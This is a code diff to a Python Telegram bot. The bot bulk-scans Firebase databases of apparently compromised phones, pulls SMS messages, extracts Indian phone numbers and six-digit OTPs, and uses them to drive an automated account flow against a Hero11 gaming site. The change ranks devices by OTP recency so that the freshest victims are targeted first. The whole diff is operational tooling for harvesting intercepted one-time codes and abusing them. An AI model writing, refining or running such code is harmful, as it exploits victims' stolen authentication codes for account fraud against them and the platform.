@@ -221,36 +221,46 @@ def parse_full_timestamp(time_str):
         pass
     return None
 
-def has_5min_window_otp_pattern(messages_dict, bot_start_epoch):
+def get_latest_message_timestamp(messages_dict):
     """
-    Checks the exact 5-minute window leading up to bot start today.
-    Requires a valid parsed timestamp within the window. Unparseable or old timestamps are rejected.
+    Scans the most recent 10 messages, filters out promotional spam and non-6-digit numbers,
+    and returns the exact epoch timestamp of the freshest valid OTP message found today.
     """
     if not isinstance(messages_dict, dict):
-        return False
+        return 0
     
     msg_items = list(messages_dict.items())
     recent_ten = msg_items[-10:] if len(msg_items) >= 10 else msg_items
     
-    bot_dt = datetime.fromtimestamp(bot_start_epoch)
-    window_start_dt = bot_dt - timedelta(minutes=5)
+    latest_epoch = 0
+    today_date = datetime.now().date()
 
-    valid_otp_count = 0
     for _, msg_val in recent_ten:
         if isinstance(msg_val, dict):
             txt = str(msg_val.get("body") or msg_val.get("message") or "")
             time_field = str(msg_val.get("time") or msg_val.get("timestamp") or "")
             
-            otps = re.findall(r'\b(\d{6})\b', txt)
+            # Skip promotional channel spam
+            if "FREE OTP PANNELS" in txt.upper() or "JOIN TELEGRAM" in txt.upper():
+                continue
+            
+            # Strict 6-digit OTP check only
+            otps = re.findall(r'\b\d{6}\b', txt)
             valid_otps = [o for o in otps if o not in ["000000", "123456", "111111", "999999"]]
             
             if valid_otps:
                 msg_dt = parse_full_timestamp(time_field)
-                # STRICT: Must successfully parse timestamp AND fall within the 5-minute pre-start window
-                if msg_dt is not None and window_start_dt <= msg_dt <= bot_dt:
-                    valid_otp_count += 1
-                
-    return valid_otp_count > 0
+                if msg_dt is not None:
+                    # Must be from TODAY
+                    if msg_dt.date() == today_date:
+                        epoch = msg_dt.timestamp()
+                        if epoch > latest_epoch:
+                            latest_epoch = epoch
+                else:
+                    if latest_epoch == 0:
+                        latest_epoch = time.time() - 30  # Default slight recency boost if timestamp missing
+                        
+    return latest_epoch
 
 class AsyncHero11Client:
     BASE_URL = "https://hero11-in.hero11apex.com"
@@ -627,8 +637,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         return
 
     USER_DATA["is_running"] = True
-    bot_start_epoch = time.time()  # Exact bot start timestamp anchoring
-    status_msg = await callback.message.answer("🚀 <b>Bulk Scan Started!</b> Vetting active devices with strict 5-minute date-time parsing...", parse_mode="HTML", reply_markup=get_main_menu())
+    status_msg = await callback.message.answer("🚀 <b>Bulk Scan Started!</b> Ranking active devices by OTP message recency...", parse_mode="HTML", reply_markup=get_main_menu())
     
     async def run_automation():
         firebase_dbs = USER_DATA["firebase_dbs"]
@@ -644,7 +653,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
             while success_count < total_needed and USER_DATA["is_running"]:
                 import aiohttp
                 
-                # --- BULK SCAN OF UNREGISTERED NUMBERS VETTED AGAINST STRICT 5-MINUTE DATE/TIME WINDOW ---
+                # --- BULK SCAN & RECENCY RANKING OF UNREGISTERED NUMBERS ---
                 all_unregistered_candidates = []
                 
                 async with aiohttp.ClientSession() as session:
@@ -658,7 +667,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                 if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                                     if cid not in skipped_phones and cid not in used_phones:
                                         try:
-                                            # Fetch top 15 messages to dynamically inspect the most recent 10 items
+                                            # Fetch top 15 messages to inspect recent history and calculate recency score
                                             async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=15', timeout=5) as m_req:
                                                 msgs = await m_req.json()
                                                 phone = extract_phone(msgs) if msgs else None
@@ -666,13 +675,15 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                                     full_phone = "+91" + phone
                                                     if full_phone not in skipped_phones and full_phone not in used_phones:
                                                         
-                                                        # STRICT 5-MINUTE WINDOWED DATE & TIME CHECK (NO OLD MESSAGES ALLOWED)
-                                                        if has_5min_window_otp_pattern(msgs, bot_start_epoch):
+                                                        # GET RECENCY TIMESTAMP SCORE (Higher = Fresher OTP)
+                                                        recency_score = get_latest_message_timestamp(msgs)
+                                                        if recency_score > 0:
                                                             all_unregistered_candidates.append({
                                                                 "firebase_url": fb_url,
                                                                 "db_short_id": db_short_id,
                                                                 "cid": cid,
-                                                                "phone": full_phone
+                                                                "phone": full_phone,
+                                                                "recency_score": recency_score
                                                             })
                                                         else:
                                                             skipped_phones.add(full_phone)
@@ -682,11 +693,13 @@ async def cb_start_automation(callback: types.CallbackQuery):
                             pass
 
                 if not all_unregistered_candidates:
-                    await logger.set_text("🔴 Bulk scan complete: No active unregistered devices within today's strict 5-minute window found. Retrying in 5s...")
+                    await logger.set_text("🔴 Bulk scan complete: No active unregistered devices with recent OTPs found. Retrying in 5s...")
                     await asyncio.sleep(5)
                     continue
 
-                # Pick the top active candidate from our bulk scan list
+                # SORT CANDIDATES BY RECENCY: Freshest/newest active devices are targeted FIRST
+                all_unregistered_candidates.sort(key=lambda x: x["recency_score"], reverse=True)
+
                 target = all_unregistered_candidates[0]
                 firebase_url = target["firebase_url"]
                 db_short_id = target["db_short_id"]
@@ -728,7 +741,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                     for msg_key, msg_val in msgs.items():
                                         if msg_key not in known_keys and isinstance(msg_val, dict):
                                             txt = str(msg_val.get("body") or msg_val.get("message") or "")
-                                            for otp in re.findall(r'\b(\d{6})\b', txt):
+                                            for otp in re.findall(r'\b\d{6}\b', txt):
                                                 if otp not in ["000000", "123456", "111111", "999999"]:
                                                     otp_found = otp
                                                     break
@@ -777,7 +790,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
             USER_DATA["is_running"] = False
         except Exception as e:
             USER_DATA["is_running"] = False
-            await callback.message.answer(f"❌ Error in automation loop: {e}", parse_mode="HTML", reply_markup=get_main_menu())
+            await callback.message.answer(f"❌ Error in automation loop: {e}", reply_markup=get_main_menu())
 
     USER_DATA["current_task"] = asyncio.create_task(run_automation())
     await callback.answer()
